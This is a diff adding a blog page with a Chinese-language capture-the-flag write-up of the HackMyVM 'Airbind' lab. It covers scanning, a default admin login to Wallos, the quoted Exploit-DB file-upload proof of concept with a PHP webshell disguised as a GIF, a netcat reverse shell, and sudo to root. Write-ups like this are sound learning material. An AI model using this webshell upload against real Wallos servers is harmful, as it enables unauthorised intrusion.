@@ -1,0 +1,458 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-Airbind | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="难度:Medium kali:192.168.56.104 靶机:192.168.56.184 &gt; arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104 Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;ro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-Airbind">
+<meta property="og:url" content="https://tao0845.github.io/posts/a88f73eb/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="难度:Medium kali:192.168.56.104 靶机:192.168.56.184 &gt; arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104 Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;ro">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/12/OJX2bP.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/12/OJX6mb.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/12/OJX8Vl.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/12/OJXuqg.png">
+<meta property="article:published_time" content="2024-06-12T08:19:14.383Z">
+<meta property="article:modified_time" content="2024-06-13T07:41:36.287Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="ipv6bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/06/12/OJX2bP.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">69</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">107</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-root"><span class="toc-number">3.</span> <span class="toc-text">ssh-root</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/a88f73eb/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-Airbind</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-06-12 16:19:14" itemprop="dateCreated datePublished" datetime="2024-06-12T16:19:14+08:00">2024-06-12</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-06-13 15:41:36" itemprop="dateModified" datetime="2024-06-13T15:41:36+08:00">2024-06-13</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">2.9k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">16m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/ipv6bypass/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ipv6bypass</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:Medium</strong></p>
+<p><strong>kali:192.168.56.104</strong></p>
+<p><strong>靶机:192.168.56.184</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.56.100  08:00:27:d2:f8:5d       PCS Systemtechnik GmbH
+<span class="token number">192.168</span>.56.184  08:00:27:42:db:30       PCS Systemtechnik GmbH
+
+<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
+Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.937</span> seconds <span class="token punctuation">(</span><span class="token number">132.16</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded
+</code></pre>
+<p>上课上一半，看群里群主又把机子给秒了，这就是人与人之间的差距吗?迫不及待，下课立马打开靶机，做了一通，迅速拿到root但是在虚拟机里面，不知所措的时候，群主发了wp，也是成功拿到root flag，这里复盘记录一下。</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.184 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-12 <span class="token number">16</span>:20 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.184
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00026s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE    SERVICE VERSION
+<span class="token number">22</span>/tcp filtered <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>     http    Apache httpd <span class="token number">2.4</span>.57 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token operator">|</span> http-title: Wallos - Subscription Tracker
+<span class="token operator">|</span>_Requested resource was login.php
+<span class="token operator">|</span>_http-server-header: Apache/2.4.57 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span> http-cookie-flags: 
+<span class="token operator">|</span>   /: 
+<span class="token operator">|</span>     PHPSESSID: 
+<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
+MAC Address: 08:00:27:42:DB:30 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.
+TCP/IP fingerprint:
+OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span><span class="token number">7</span>.94SVN%E<span class="token operator">=</span><span class="token number">4</span>%D<span class="token operator">=</span><span class="token number">6</span>/12%OT<span class="token operator">=</span><span class="token number">80</span>%CT<span class="token operator">=</span><span class="token number">1</span>%CU<span class="token operator">=</span><span class="token number">40326</span>%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span><span class="token number">1</span>%DC<span class="token operator">=</span>D%G<span class="token operator">=</span>Y%M<span class="token operator">=</span>08002
+OS:7%TM<span class="token operator">=</span>66695A53%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>FF%GCD<span class="token operator">=</span><span class="token number">1</span>%ISR<span class="token operator">=</span><span class="token number">100</span>%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II
+OS:<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>FF%GCD<span class="token operator">=</span><span class="token number">2</span>%ISR<span class="token operator">=</span><span class="token number">100</span>%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>O1<span class="token operator">=</span>M5B4ST11NW7%O
+OS:2<span class="token operator">=</span>M5B4ST11NW7%O3<span class="token operator">=</span>M5B4NNT11NW7%O4<span class="token operator">=</span>M5B4ST11NW7%O5<span class="token operator">=</span>M5B4ST11NW7%O6<span class="token operator">=</span>M5B4ST11<span class="token punctuation">)</span>
+OS:WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>FE88%W2<span class="token operator">=</span>FE88%W3<span class="token operator">=</span>FE88%W4<span class="token operator">=</span>FE88%W5<span class="token operator">=</span>FE88%W6<span class="token operator">=</span>FE88<span class="token punctuation">)</span>ECN<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>3F%W<span class="token operator">=</span>
+OS:FAF0%O<span class="token operator">=</span>M5B4NNSNW7%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>3F%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AS%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%
+OS:DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>O%F<span class="token operator">=</span>AR%
+OS:O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>3F%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%
+OS:W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span>
+OS:<span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>N%T<span class="token operator">=</span><span class="token number">40</span>%IPL<span class="token operator">=</span><span class="token number">164</span>%
+OS:UN<span class="token operator">=</span><span class="token number">0</span>%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%T<span class="token operator">=</span><span class="token number">40</span>%CD<span class="token operator">=</span>S<span class="token punctuation">)</span>
+
+Network Distance: <span class="token number">1</span> hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="token number">1</span>   <span class="token number">0.26</span> ms <span class="token number">192.168</span>.56.184
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">17.12</span> seconds</code></pre>
+<p>2端口又被过滤了，昨天刚做一个过滤用到的knock敲开<br>先不急，这个后说</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开一看是wallos<br><img src="https://ooo.0x0.ooo/2024/06/12/OJX2bP.png" alt="OJX2bP.png" loading="lazy"><br>直接给了后台<br>弱口令<code>admin</code> <code>admin</code>直接进去<br>进去之后搜了一下漏洞</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> searchsploit  wallos
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                                <span class="token operator">|</span>  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Wallos <span class="token operator">&lt;</span> <span class="token number">1.11</span>.2 - File Upload RCE                                                                                                                                                                             <span class="token operator">|</span> php/webapps/51924.txt
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results</code></pre>
+<p>正好有个文件上传漏洞</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> /usr/share/exploitdb/exploits/php/webapps/51924.txt 
+<span class="token comment"># Exploit Title: Wallos - File Upload RCE (Authenticated)</span>
+<span class="token comment"># Date: 2024-03-04</span>
+<span class="token comment"># Exploit Author: sml@lacashita.com</span>
+<span class="token comment"># Vendor Homepage: https://github.com/ellite/Wallos</span>
+<span class="token comment"># Software Link: https://github.com/ellite/Wallos</span>
+<span class="token comment"># Version: &lt; 1.11.2</span>
+<span class="token comment"># Tested on: Debian 12</span>
+
+Wallos allows you to upload an image/logo when you create a new subscription.
+This can be bypassed to upload a malicious .php file.
+
+POC
+---
+
+<span class="token number">1</span><span class="token punctuation">)</span> Log into the application.
+<span class="token number">2</span><span class="token punctuation">)</span> Go to <span class="token string">"New Subscription"</span>
+<span class="token number">3</span><span class="token punctuation">)</span> Upload Logo and choose your webshell .php
+<span class="token number">4</span><span class="token punctuation">)</span> Make the Request changing Content-Type to image/jpeg and adding <span class="token string">"GIF89a"</span>, it should be like:
+
+--- SNIP -----------------
+
+POST /endpoints/subscription/add.php HTTP/1.1
+
+Host: <span class="token number">192.168</span>.1.44
+
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">;</span> rv:102.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/102.0
+
+Accept: */*
+
+Accept-Language: en-US,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://192.168.1.44/
+
+Content-Type: multipart/form-data<span class="token punctuation">;</span> <span class="token assign-left variable">boundary</span><span class="token operator">=</span>---------------------------29251442139477260933920738324
+
+Origin: http://192.168.1.44
+
+Content-Length: <span class="token number">7220</span>
+
+Connection: close
+
+Cookie: <span class="token assign-left variable">theme</span><span class="token operator">=</span>light<span class="token punctuation">;</span> <span class="token assign-left variable">language</span><span class="token operator">=</span>en<span class="token punctuation">;</span> <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>6a3e5adc1b74b0f1870bbfceb16cda4b<span class="token punctuation">;</span> <span class="token assign-left variable">theme</span><span class="token operator">=</span>light
+
+-----------------------------29251442139477260933920738324
+
+Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"name"</span>
+
+<span class="token builtin class-name">test</span>
+
+-----------------------------29251442139477260933920738324
+
+Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"logo"</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"revshell.php"</span>
+
+Content-Type: image/jpeg
+
+GIF89a<span class="token punctuation">;</span>
+
+<span class="token operator">&lt;</span>?php
+system<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+
+-----------------------------29251442139477260933920738324
+
+Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"logo-url"</span>
+
+----- SNIP -----
+
+<span class="token number">5</span><span class="token punctuation">)</span> You will get the response that your <span class="token function">file</span> was uploaded ok:
+
+<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token builtin class-name">:</span><span class="token string">"Success"</span>,<span class="token string">"message"</span><span class="token builtin class-name">:</span><span class="token string">"Subscription updated successfully"</span><span class="token punctuation">&#125;</span>
+
+
+<span class="token number">6</span><span class="token punctuation">)</span> Your <span class="token function">file</span> will be located in:
+http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php<span class="token comment">#  </span></code></pre>
+<p>简单的加个gif文件头和改一下mm属性<br><img src="https://ooo.0x0.ooo/2024/06/12/OJX6mb.png" alt="OJX6mb.png" loading="lazy"><br>上传成功之后访问<code>http://VICTIM_IP/images/uploads/logos</code>找到上传的文件名<br><img src="https://ooo.0x0.ooo/2024/06/12/OJX8Vl.png" alt="OJX8Vl.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/12/OJXuqg.png" alt="OJXuqg.png" loading="lazy">可以看到成功rce<br>反弹shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop/airbind                                                                                                                                                                                                        root@kali2  <span class="token number">16</span>:38:21 
+<span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>             
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.184<span class="token punctuation">]</span> <span class="token number">34884</span>
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">210</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+www-data@ubuntu:/var/www/html/images/uploads/logos$ <span class="token function">id</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
+<p>习惯地sudo一手</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@ubuntu:/var/www$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> www-data on ubuntu:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on ubuntu:
+    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL</code></pre>
+<p>看到这我tm还以为无敌了，没想到还有高手。<br>sudo bash拿到root shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@ubuntu:/var/www$ <span class="token function">sudo</span> <span class="token function">bash</span>
+<span class="token function">sudo</span> <span class="token function">bash</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+<p>简单地升级一下shell之后</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:/var/www<span class="token comment"># cd ~</span>
+root@ubuntu:~<span class="token comment"># ls -al</span>
+total <span class="token number">40</span>
+drwx------  <span class="token number">4</span> root root <span class="token number">4096</span> May <span class="token number">21</span> <span class="token number">15</span>:07 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">17</span> root root <span class="token number">4096</span> Jun <span class="token number">12</span> 07:53 <span class="token punctuation">..</span>
+lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">9</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:09 .bash_history -<span class="token operator">></span> /dev/null
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3106</span> Oct <span class="token number">17</span>  <span class="token number">2022</span> .bashrc
+-rw-------  <span class="token number">1</span> root root   <span class="token number">20</span> May <span class="token number">21</span> <span class="token number">14</span>:49 .lesshst
+drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Apr  <span class="token number">1</span> <span class="token number">11</span>:20 .local
+-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
+-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">66</span> May <span class="token number">21</span> <span class="token number">14</span>:49 .selected_editor
